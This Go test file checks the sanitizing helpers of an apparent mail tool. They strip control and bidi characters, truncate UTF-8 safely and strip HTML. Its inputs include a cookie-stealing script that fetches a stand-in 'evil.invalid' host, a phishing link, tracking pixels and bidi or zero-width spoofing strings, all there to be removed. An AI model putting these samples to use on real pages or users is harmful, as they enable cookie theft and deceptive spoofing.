package mailmcp

import (
	"strings"
	"testing"
	"unicode/utf8"
)

func TestSanitize(t *testing.T) {
	tests := []struct{ name, in, want string }{
		{"crlf", "a\r\nb\r\n", "a\nb\n"},
		{"lone cr and controls", "a\rb\x00c\x1bd\x7fe", "abcde"},
		{"keeps tab and newline", "a\tb\nc", "a\tb\nc"},
		{"c1", "a\u0085b\u009bc", "abc"},
		{"bidi", "safe\u202egnp.exe\u2066x\u2069", "safegnp.exex"},
		{"zero width", "pay\u200bpal\u200d\u2060\ufeff", "paypal"},
		{"tag characters", "hi\U000E0041\U000E007F", "hi"},
		{"invalid utf-8", "a\xffb", "a\ufffdb"},
		{"unicode kept", "Grüße – 日本語 📬", "Grüße – 日本語 📬"},
	}
	for _, tt := range tests {
		if got := sanitize(tt.in); got != tt.want {
			t.Errorf("%s: %q, want %q", tt.name, got, tt.want)
		}
	}
	if got := sanitizeLine("Subject\r\n\tfolded"); got != "Subject  folded" {
		t.Errorf("sanitizeLine: %q", got)
	}
	if got := sanitizeLine(strings.Repeat("é", 600)); len(got) != maxHeaderBytes || !utf8.ValidString(got) {
		t.Errorf("header cap: %d bytes", len(got))
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		in    string
		n     int
		want  string
		trunc bool
	}{
		{"hello", 10, "hello", false},
		{"hello", 5, "hello", false},
		{"hello", 4, "hell", true},
		{"aé", 2, "a", true}, // é is two bytes; never split it
		{"a📬", 4, "a", true},
		{"📬", 3, "", true},
	}
	for _, tt := range tests {
		got, cut := truncate(tt.in, tt.n)
		if got != tt.want || cut != tt.trunc || !utf8.ValidString(got) {
			t.Errorf("truncate(%q, %d) = %q, %v", tt.in, tt.n, got, cut)
		}
	}
}

func TestStripHTML(t *testing.T) {
	tracker := `<!DOCTYPE html>
<html><head><title>News</title><style>p{color:red}</style></head><body>
<p>HTML newsletter body.</p>
<img src="https://tracker.invalid/pixel.gif?u=alice" width="1" height="1">
<div style="display:none"><img src='https://tracker.invalid/beacon?a=1&b=2'></div>
<a href="https://phish.invalid/login" title="a > b">Verify your account</a>
<script>fetch("https://evil.invalid/"+document.cookie)</script>
<!-- <p>hidden comment</p> -->
<p>Unsubscribe &amp; more &lt;here&gt; &#x1F4EC;</p>
</body></html>`
	got := stripHTML(tracker)
	want := "HTML newsletter body.\n\nVerify your account\n\nUnsubscribe & more <here> 📬"
	if got != want {
		t.Errorf("got %q\nwant %q", got, want)
	}
	for _, bad := range []string{"tracker.invalid", "phish.invalid", "evil.invalid", "hidden comment", "color:red", "News"} {
		if strings.Contains(got, bad) {
			t.Errorf("output keeps %q", bad)
		}
	}

	tests := []struct{ name, in, want string }{
		{"br and block tags", "a<br>b<br/>c<div>d</div><li>e", "a\nb\nc\nd\n\ne"},
		{"literal less-than", "1 < 2 and 3 > 2", "1 < 2 and 3 > 2"},
		{"uppercase tags", "<SCRIPT>x</SCRIPT><P>y</P>", "y"},
		{"unterminated tag hides the rest", "ok <img src=x", "ok"},
		{"unterminated comment", "ok <!-- never closed", "ok"},
		{"blank lines collapse", "<p>a</p><p></p><p></p><p>b</p>", "a\n\nb"},
	}
	for _, tt := range tests {
		if got := stripHTML(tt.in); got != tt.want {
			t.Errorf("%s: %q, want %q", tt.name, got, tt.want)
		}
	}
}
